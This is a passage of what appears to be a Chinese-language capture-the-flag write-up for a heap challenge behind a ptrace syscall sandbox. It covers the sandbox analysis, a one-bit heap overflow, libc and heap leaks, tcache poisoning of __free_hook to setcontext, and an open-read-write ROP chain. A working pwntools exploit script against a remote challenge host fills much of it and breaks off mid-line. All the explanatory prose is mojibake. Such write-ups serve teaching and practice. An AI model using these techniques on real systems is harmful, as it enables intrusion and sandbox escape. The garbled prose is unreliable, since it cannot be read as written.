/><p>æ‰€ä»¥æˆ‘ä»¬å»å°†v8çš„ç±»å‹æ”¹æˆuser_regs_struct(å¦‚ä¸‹)</p><p><img src="/../img/image-20221031093545472.png" alt="image-20221031093545472"></p><p>åŒæ—¶è¿˜å¯ä»¥çœ‹åˆ°ç”±äºv8ç¡®å®šä¸ºç»“æ„ä½“åï¼Œé‡Œé¢çš„ä¸€äº›å¯„å­˜å™¨ä¹Ÿåœ¨IDAä¸­æ˜¾ç¤ºäº†å‡ºæ¥</p><img src="../img/image-20221031093911118.png" alt="image-20221031093911118" style="zoom:50%;" /><p>è¿™æ—¶å€™æˆ‘ä»¬ä»å¤´åˆ†æä¸€ä¸‹ï¼Œforkçš„è¿”å›å€¼ç»™äº†v3ï¼Œç„¶ååˆæŠŠv3ç»™v4.æ¥ç€if(v3)ï¼Œè€Œforkå‡½æ•°ä¼šæœ‰ä¸¤ä¸ªè¿”å›å€¼ï¼ŒåŸæœ¬çš„çˆ¶è¿›ç¨‹ä¼šè¿”å›å­è¿›ç¨‹çš„id,è€Œå­è¿›ç¨‹åˆ™è¿”å›0ã€‚æ‰€ä»¥æ¥ä¸‹æ¥çš„if(v3)åªæœ‰çˆ¶è¿›ç¨‹(sandbox)èƒ½è¿›</p><p><img src="/../img/image-20221031094002359.png" alt="image-20221031094002359"></p><p>å­è¿›ç¨‹è¿”å›çš„æ˜¯0ï¼Œæ‰€ä»¥è§¦å‘else(å¦‚ä¸‹)</p><p><img src="/../img/image-20221031094347999.png" alt="image-20221031094347999"></p><p>ç¬¬ä¸€è¡Œçš„ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL)è¡¨ç¤ºè¢«çˆ¶è¿›ç¨‹è·Ÿè¸ªï¼Œä»»ä½•ä¿¡å·(åŒ…æ‹¬å­è¿›ç¨‹ä¸­æ‰§è¡Œçš„syscall)éƒ½ä¼šæš‚åœå­è¿›ç¨‹ï¼Œé˜»å¡ä¸wait()ç­‰å¾…çš„çˆ¶è¿›ç¨‹è¢«å”¤é†’ã€‚ç¬¬äºŒè¡Œçš„execvpåˆ™æ‰§è¡Œäº†a2[1]è¿™ä¸ªæ–‡ä»¶ï¼Œa2åˆ™æ˜¯å‘½ä»¤è¡Œå‚æ•°ï¼Œè¿™é“é¢˜çš„æ²™ç®±è‡ªç„¶æ˜¯ç»™sandboxheapå¼€çš„ï¼Œæ‰€ä»¥æœ¬é¢˜æ­£ç¡®çš„è¿è¡Œæ–¹å¼åº”è¯¥æ˜¯<code>./sandbox ./sandboxheap</code> ï¼Œè¿™æ ·å­è¿›ç¨‹å°±è°ƒç”¨äº†é¢˜ç›®çš„é™„ä»¶ã€‚ä»è€Œå®ç°äº†ä¸ªsandboxheapå¼€äº†ä¸€ä¸ªæ²™ç®±ä¿æŠ¤ã€‚</p><p>æ¥ç€å›åˆ°çˆ¶è¿›ç¨‹é‚£è¾¹ï¼Œç°åœ¨å»çœ‹ä¸€ä¸‹è¿™ä¸ªæ²™ç®±æ˜¯æ€ä¹ˆå®ç°å¯¹æŸäº›ç³»ç»Ÿè°ƒç”¨çš„æ‹¦æˆªçš„</p><p><img src="/../img/image-20221031100404042.png" alt="image-20221031100404042"></p><p>åœ¨â‘ çš„ä½ç½®ä½¿ç”¨äº†ptrace(PTRACE_GETREGS, child_pid, NULL, &amp;regs)ï¼Œæ­¤æ—¶å­è¿›ç¨‹çš„å¯„å­˜å™¨ä¿¡æ¯ä¼šå­˜å‚¨åˆ°regsç»“æ„ä½“é‡Œï¼Œè€Œåœ¨â‘¡çš„ä¸Šé¢ä¸€è¡Œï¼Œå»èµ‹ç»™äº†regs.raxä¸º-1ï¼Œç„¶åæ‰§è¡Œâ‘¡çš„æ—¶å€™ï¼Œptrace(PTRACE_SETREGS, child_pid, NULL, &amp;regs) ä¼šå°†regsç»“æ„ä½“é‡Œçš„å€¼æ‹·è´ç»™å­è¿›ç¨‹çš„å„ä¸ªå¯„å­˜å™¨ï¼Œè¿™æ ·å­è¿›ç¨‹çš„raxå°±å˜æˆäº†-1ï¼Œå½“å­è¿›ç¨‹å»æ‰§è¡Œsyscallçš„æ—¶å€™å‘ç°raxæ˜¯ä¸€ä¸ªæ— æ•ˆçš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œå°±ä¼šæŠ¥bad syscallä»è€Œå®Œæˆäº†æ‹¦æˆªã€‚</p><p>è€Œæˆ‘ä»¬è¦ç»•è¿‡æ²™ç®±çš„ç¦ç”¨ï¼Œæ‰€ä»¥æƒ³åŠæ³•ä¸èƒ½è¢«æ‹¦æˆªä¸‹æ¥ã€‚é‡æ–°çœ‹ä¸€ä¸‹è§„åˆ™ï¼Œåªè¦æˆ‘ä»¬èƒ½ä¿è¯è¿™ä¸ªä½ç½®çš„æ•°å€¼æ˜¯0ï¼Œé‚£å°±ä¸ä¼šè¢«æ‹¦æˆªä¸‹æ¥(å¦‚ä¸‹)</p><p><img src="/../img/image-20221031101842345.png" alt="image-20221031101842345"></p><p>ä½†æ˜¯åœ¨æœ€å¼€å§‹æ‰§è¡Œalarmç³»ç»Ÿè°ƒç”¨(ç³»ç»Ÿè°ƒç”¨å·ä¸º37)çš„æ—¶å€™ï¼Œå¯¹0x202040è¿™ç‰‡å†…å­˜è¿›è¡Œäº†èµ‹å€¼ä¸º1çš„æ“ä½œ(å¦‚ä¸‹)ï¼Œä¹Ÿå°±æ˜¯è¯´æ­£å¸¸çš„è¯ï¼Œæˆ‘ä»¬raxæ— è®ºæ˜¯å¤šå°‘ï¼Œæœ€ç»ˆåŠ ä¸Š0x202040è¿™ä¸ªåœ°å€æ‹¿åˆ°çš„éƒ½æ˜¯1ï¼Œä»è€Œè¢«æ‹¦æˆªã€‚</p><p><img src="/../img/image-20221031102022071.png" alt="image-20221031102022071"></p><img src="../img/image-20221031102056360.png" alt="image-20221031102056360" style="zoom:50%;" /><p>ä½†æ˜¯æˆ‘ä»¬å‘ç°ç¨‹åºé‡Œç»™äº†ä¸€äº›ä½ç½®ä¸º0çš„æœºä¼šï¼Œæˆ‘ä»¬å°†ç»™çš„è¿™äº›åœ°å€éƒ½å»å‡0x202040åï¼Œçœ‹ä¸€ä¸‹å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨(å¦‚ä¸‹)</p><p>å¦‚æœæˆ‘ä»¬æƒ³æŠŠopenå’Œreadã€writeéƒ½ä½ç½®éƒ½ç½®æˆ1ï¼Œé‚£å°±éœ€è¦ä¸‹é¢çš„ä¸¤ä¸ªifå…¨éƒ¨è¿›å…¥ï¼Œè€Œa1å¦‚æœä¸º3çš„è¯ï¼Œå°±å¯ä»¥æ»¡è¶³ä¸¤ä¸ªifçš„åˆ¤æ–­</p><img src="../img/image-20221031102922661.png" alt="image-20221031102922661" style="zoom:50%;" /><p>è¿™ä¸ªa1å°±æ˜¯rdiï¼Œè€Œæƒ³è¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œéœ€è¦raxä¸º0x2710(å¦‚ä¸‹)</p><img src="../img/image-20221031103414119.png" alt="image-20221031103414119" style="zoom:50%;" /><p>ç»¼ä¸Šæ‰€è¿°ï¼Œå¦‚æœæˆ‘ä»¬æƒ³å®Œæˆorwçš„è¯ï¼Œéœ€è¦åœ¨æ­¤ä¹‹å‰è®¾ç½®rdiä¸º3 raxä¸º0x2710å¹¶æ‰§è¡Œä¸€æ¬¡syscallï¼Œæ‰èƒ½è‡ªå®šä¹‰ä¸€ä¸ªèƒ½å¤Ÿorwçš„ç™½åå•ã€‚</p><h3 id="æ¼æ´æ‰€åœ¨ï¼š"><a href="#æ¼æ´æ‰€åœ¨ï¼š" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h3><img src="../img/image-20221030114430759.png" alt="image-20221030114430759" style="zoom:50%;" /><p>åœ¨editå‡½æ•°é‡Œï¼Œinputå‡½æ•°(å‡½æ•°å·²é‡å‘½å)çš„å‚æ•°æœ‰ä¸ª+1ï¼Œæ‰€ä»¥åˆ¤æ–­è¿™é‡Œæ˜¯å­˜åœ¨ä¸ªæº¢å‡ºçš„ã€‚</p><p>ç„¶åinputå‡½æ•°é‡Œé¢æ˜¯è¿™æ ·çš„(å¦‚ä¸‹)</p><img src="../img/image-20221030115609820.png" alt="image-20221030115609820" style="zoom:50%;" /><p>è¯´å®è¯è¿™ä¸ªæˆ‘æ²¡å¤ªçœ‹æ‡‚ï¼Œä¸è¿‡æ ¹æ®è°ƒè¯•å’Œå¸ˆå‚…ä»¬çš„æç¤ºï¼Œæ„Ÿè§‰è¿™é‡Œçš„å¤§æ¦‚æ„æ€å°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¾“å…¥çš„ä¸€ä¸ªå­—èŠ‚åªå–æœ«å°¾ä¸€ä¸ªæ¯”ç‰¹ï¼Œè€Œå…«ä¸ªå­—èŠ‚å°±ä¼šå–å‡ºæ¥å…«ä¸ªæ¯”ç‰¹ï¼Œè¿™å–å‡ºæ¥çš„å…«ä¸ªæ¯”ç‰¹æ‰è¡¨ç¤ºå‡ºäº†ä¸€ä¸ªå­—èŠ‚ã€‚åœ¨ä»¥å‰æˆ‘ä»¬æƒ³å‘é€p64()æ‰“åŒ…åçš„æ•°æ®ï¼Œä»…ä»…åªéœ€è¦å‘é€å…«å­—èŠ‚ï¼Œä½†æ˜¯åœ¨è¿™é¢˜é‡Œï¼Œæˆ‘ä»¬éœ€è¦ç”¨64ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºä¸€ä¸ªå…«å­—èŠ‚çš„åœ°å€ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬åŸæœ¬è¦å¾€å†…å­˜é‡Œå†™ä¸€ä¸ªåœ°å€ä¸º<code>0xdeadbeef</code>ï¼Œä»¥å‰çš„è¯ï¼Œæˆ‘ä»¬ä½¿ç”¨p64(0xdeadbeef)å³å¯ï¼Œä½†æ˜¯è¿™é“é¢˜çš„è¯ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸‹é¢çš„éƒ¨åˆ†æ‰èƒ½è¾¾åˆ°åŒæ ·çš„æ•ˆæœ</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">bin</span>(<span class="number">0xdeadbeef</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>é‡æ–°å›åˆ°æ¼æ´ä¸Šé¢ï¼Œè¿™é“é¢˜é€šè¿‡è°ƒè¯•å¯ä»¥å‘ç°æ˜¯æº¢å‡ºäº†ä¸€ä¸ªæ¯”ç‰¹ï¼Œå…¶å®è·Ÿoff by nullçš„æ€è·¯ä¸€æ ·ï¼Œéƒ½æ˜¯å»æº¢å‡ºç„¶åç¯¡æ”¹å †å—çš„prev_inuseä½ï¼Œç„¶åå»æ‰“ä¸€ä¸ªå †å—åˆå¹¶ã€‚ä½†æ˜¯è¿™é“é¢˜è¿˜æœ‰ä¸€ä¸ªéš¾ç‚¹å°±æ˜¯æœ‰æ²™ç®±ä¿æŠ¤ï¼Œé€šè¿‡åˆ†ææ²™ç®±è§„åˆ™ï¼Œæˆ‘ä»¬éœ€è¦æ‰“ä¸€æ¡ropé“¾ã€‚å› æ­¤å¯¹åº”çš„ç­–ç•¥å°±æ˜¯ç”¨setcontextæ¥æ”¹å˜å¯„å­˜å™¨çš„å€¼ï¼Œä»è€Œå°†æ‰§è¡ŒæµåŠ«æŒåˆ°ropé“¾ä¸Š</p><h3 id="åˆ©ç”¨æ€è·¯ï¼š-1"><a href="#åˆ©ç”¨æ€è·¯ï¼š-1" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>ç”±äºæˆ‘ä»¬éœ€è¦æ‰“å †å—åˆå¹¶ï¼Œæ‰€ä»¥éœ€è¦è®©åˆå¹¶çš„å †å—é‡Šæ”¾æ‰èƒ½å¤Ÿè¿›å…¥unsorted binï¼Œå› æ­¤ç¬¬ä¸€ä»¶äº‹æ˜¯å…ˆå¡«æ»¡tcache binã€‚æ¥ç€å»æ‰“å †å—åˆå¹¶,è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)    </span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#merge chunk   </span></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+<span class="string">b&#x27;00000100&#x27;</span>+<span class="string">b&#x27;10000000&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>*<span class="number">6</span>+<span class="string">b&#x27;00000000&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#å †å—åˆå¹¶</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å»æ³„éœ²å †åœ°å€å’Œlibcåœ°å€ï¼Œå¤§è‡´æ€è·¯å°±æ˜¯åšå †å—é‡å ï¼Œè®©ä¸€å—è¢«é‡Šæ”¾æ‰çš„å†…å­˜è½åœ¨ä¸€ä¸ªæ­£åœ¨ä½¿ç”¨çš„å †å—ä¸­ï¼Œä»è€Œæ‰§è¡Œshowå‡½æ•°å®Œæˆæ³„éœ²libcå’Œå †åœ°å€ã€‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xc0</span>)</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebe40</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">context_addr=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x98</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">p.recvuntil(<span class="number">0x98</span>*<span class="string">&quot;\xff&quot;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æœ€åå»æ‰“ä¸€ä¸ªtcache poisoning,å°†free_hookç”³è¯·å‡ºæ¥ï¼Œç„¶åå†™å…¥setcontext+53çš„åœ°å€ï¼Œæå‰åœ¨å †å—ä¸­å¸ƒç½®å¥½å„ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œæœ€åå»é‡Šæ”¾æ‰è¯¥å †å—ã€‚å³å¯æ§åˆ¶å„ä¸ªå¯„å­˜å™¨ï¼Œä»è€Œå»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨readã€‚å°†ropé“¾è¯»åˆ°æ‰§è¡Œæµä¸Šï¼Œä»è€Œæ‰§è¡Œropé“¾(orw)è¯»å‡ºflagã€‚</p><h3 id="å…³äºsetcontext"><a href="#å…³äºsetcontext" class="headerlink" title="å…³äºsetcontext"></a>å…³äºsetcontext</h3><p>ç”±äºæ˜¯ç¬¬ä¸€æ¬¡åˆ©ç”¨è¿™ä¸ªsetcontextï¼Œæ‰€ä»¥å¯¹setcontextåšä¸€ç‚¹æ€»ç»“ã€‚</p><p>è¿™ä¸ªsetcontextæ˜¯libcåº“é‡Œçš„ä¸€ä¸ªå‡½æ•°ï¼Œæ±‡ç¼–ä»£ç å¦‚ä¸‹:</p><p><img src="/../img/image-20221031111347679.png" alt="image-20221031111347679"></p><p>é€šè¿‡æ±‡ç¼–ä»£ç å‘ç°ï¼Œè¯¥å‡½æ•°ä¸»è¦æ˜¯é€šè¿‡å–rdiåŠ ä¸Šåç§»çš„å†…å­˜æ¥å¯¹å¤§éƒ¨åˆ†å¯„å­˜å™¨è¿›è¡Œäº†èµ‹å€¼ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶rdiï¼Œå¹¶ä¸”è®©rdiä¹‹åçš„ä¸€å®šå†…å­˜éƒ½æ˜¯å¯æ§çš„ï¼Œå°±ç›¸å½“äºæˆ‘ä»¬å¯ä»¥æ§åˆ¶å¤§éƒ¨åˆ†å¯„å­˜å™¨çš„å€¼äº†ã€‚å‡è®¾æˆ‘ä»¬å°†free_hookåŠ«æŒä¸ºsetcontext+53çš„åœ°å€,å› ä¸ºfreeå‡½æ•°æ—¶rdiæœ¬èº«å°±æ˜¯å †å—çš„åœ°å€ï¼Œæ‰€ä»¥rdiä¹‹åçš„å†…å­˜æˆ‘ä»¬ä¹Ÿæ˜¯å¯æ§çš„ï¼Œè¿™æ ·ä¸‹æ¬¡æ‰§è¡Œfreeçš„æ—¶å€™ï¼Œå°±å¯ä»¥æ§åˆ¶å¤§éƒ¨åˆ†çš„å¯„å­˜å™¨äº†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸ºäº†ä¿è¯æ‰§è¡Œæµä¸æ–­ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ§åˆ¶rcxå¯„å­˜å™¨ï¼Œåœ¨ä¸Šé¢çš„æ±‡ç¼–ä¸­æœ‰ä¸€ä¸ªpush rcxï¼Œè€Œæ¥ä¸‹æ¥æœ€åæ˜¯ä¸€ä¸ªretå¯ä»¥å°†æ‰§è¡Œæµæ§åˆ¶åˆ°rcxä¸Šï¼Œæ¢å¥è¯è¯´ï¼Œæœ€åsetcontextæ‰§è¡Œå®Œçš„ripç”±rcxå†³å®šã€‚åˆ©ç”¨æ€è·¯å°±æ˜¯è®¾ç½®å¤§éƒ¨åˆ†å¯„å­˜å™¨ï¼Œç„¶åå»æ‰“ä¸€ä¸ªreadçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå°†orwçš„ropé“¾è¯»åˆ°readå‡½æ•°è¦è¿”å›çš„åœ°å€ä¸Šï¼Œå®Œæˆorwã€‚</p><h3 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;47.95.3.91:12243&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)    </span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#merge chunk   </span></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+<span class="string">b&#x27;00000100&#x27;</span>+<span class="string">b&#x27;10000000&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>*<span class="number">6</span>+<span class="string">b&#x27;00000000&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#å †å—åˆå¹¶</span></span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">bin</span>(<span class="number">0x67616c662f2e</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>]</span><br><span class="line">edit(<span class="number">10</span>,payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xc0</span>)</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebe40</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">context_addr=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x98</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">p.recvuntil(<span class="number">0x98</span>*<span class="string">&quot;\xff&quot;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+(<span class="built_in">bin</span>(<span class="number">0x0</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode())+(<span class="built_in">bin</span>(<span class="number">0x101</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode())+(<span class="built_in">bin</span>(free_hook)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#rsp heap_addr+0x640 0xa0</span></span><br><span class="line"><span class="comment">#rsi heap_addr+0x6b0 0x70</span></span><br><span class="line"><span class="comment">#rdi heap_addr+0x6a8 0x68</span></span><br><span class="line"><span class="comment">#rdx heap_addr+0x6c8 0x88</span></span><br><span class="line"><span class="comment">#rcx heap_addr+0x6e8 0xa8</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002164f</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x0000000000130514</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000001b500</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000d2625</span></span><br><span class="line"></span><br><span class="line">payload=(<span class="built_in">bin</span>(<span class="number">0x110020</span>+libc_base)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])</span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0xdeadbeef</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])*<span class="number">12</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0x0</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rdi</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(heap_addr+<span class="number">0x640</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rsi</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0xdeadbeef</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])*<span class="number">3</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0x800</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rdx</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0xdeadbeef</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])*<span class="number">1</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(heap_addr+<span class="number">0x648</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rsp</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0x110020</span>+libc_base)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rcx</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">bin</span>(context_addr)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>]</span><br><span class="line">edit(<span class="number">14</span>,payload)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xED6</span>,<span class="number">0xEE2</span>,<span class="number">0xEEE</span>,<span class="number">0xEFA</span>,<span class="number">0xC9F</span>,<span class="number">0xBA7</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">orw = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)</span><br><span class="line">orw+=p64(pop_rax_ret)+p64(<span class="number">0x2710</span>)</span><br><span class="line">orw+=p64(syscall)</span><br><span class="line">orw+=p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(libc_base + libc.symbols[<span class="string">&#x27;close&#x27;</span>])</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(heap_addr + <span class="number">0x7f0</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_addr + <span class="number">0x5b0</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += 